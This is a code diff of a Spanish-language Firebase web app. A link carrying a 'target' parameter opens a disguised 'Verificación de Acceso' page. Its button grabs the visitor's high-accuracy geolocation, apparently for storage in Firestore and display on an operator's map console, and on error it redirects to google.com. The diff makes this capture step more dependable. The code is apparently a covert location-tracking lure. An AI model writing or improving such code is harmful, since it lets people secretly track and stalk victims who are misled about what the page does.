@@ -2,7 +2,7 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebas
 import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-// CONFIGURACIÓN DE FIREBASE (Reemplaza con tus llaves reales)
+// CONFIGURACIÓN DE FIREBASE (Asegúrate de colocar tus credenciales reales)
 const firebaseConfig = {
     apiKey: "TU_API_KEY",
     authDomain: "tu-proyecto.firebaseapp.com",
@@ -34,17 +34,8 @@ const urlParams = new URLSearchParams(window.location.search);
 const targetId = urlParams.get('target');
 
 document.addEventListener("DOMContentLoaded", async function () {
-    try {
-        // Autenticación anónima obligatoria para Firestore Rules
-        await signInAnonymously(auth);
-        console.log("Sesión segura iniciada.");
-    } catch (error) {
-        console.error("Error al autenticar en Firebase Auth:", error);
-    }
-
     // ESCENARIO A: Dispositivo secundario (Target)
     if (targetId) {
-        // Se crea un botón interactivo para cumplir con la política de interacción de navegadores móviles
         document.body.innerHTML = `
             <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; background:#121212; color:white; font-family:sans-serif; text-align:center; padding:20px;">
                 <h2 style="margin-bottom:20px;">Verificación de Acceso</h2>
@@ -54,13 +45,31 @@ document.addEventListener("DOMContentLoaded", async function () {
             </div>
         `;
 
-        document.getElementById('btn-capturar').addEventListener('click', () => {
+        document.getElementById('btn-capturar').addEventListener('click', async () => {
+            const btn = document.getElementById('btn-capturar');
+            btn.innerText = "Procesando...";
+            btn.disabled = true;
+            
+            // Garantizar autenticación antes de intentar escribir en Firestore
+            try {
+                await signInAnonymously(auth);
+            } catch (err) {
+                console.error("Error de Auth:", err);
+            }
+            
             capturarYSalir(targetId);
         });
         return;
     }
 
     // ESCENARIO B: Consola Principal
+    try {
+        await signInAnonymously(auth);
+        console.log("Sesión segura iniciada.");
+    } catch (error) {
+        console.error("Error al autenticar en Firebase Auth:", error);
+    }
+
     map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);
 
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -104,7 +113,7 @@ function capturarYSalir(id) {
             console.error("Error obteniendo ubicación:", error);
             window.location.replace("https://www.google.com");
         },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
 }
 
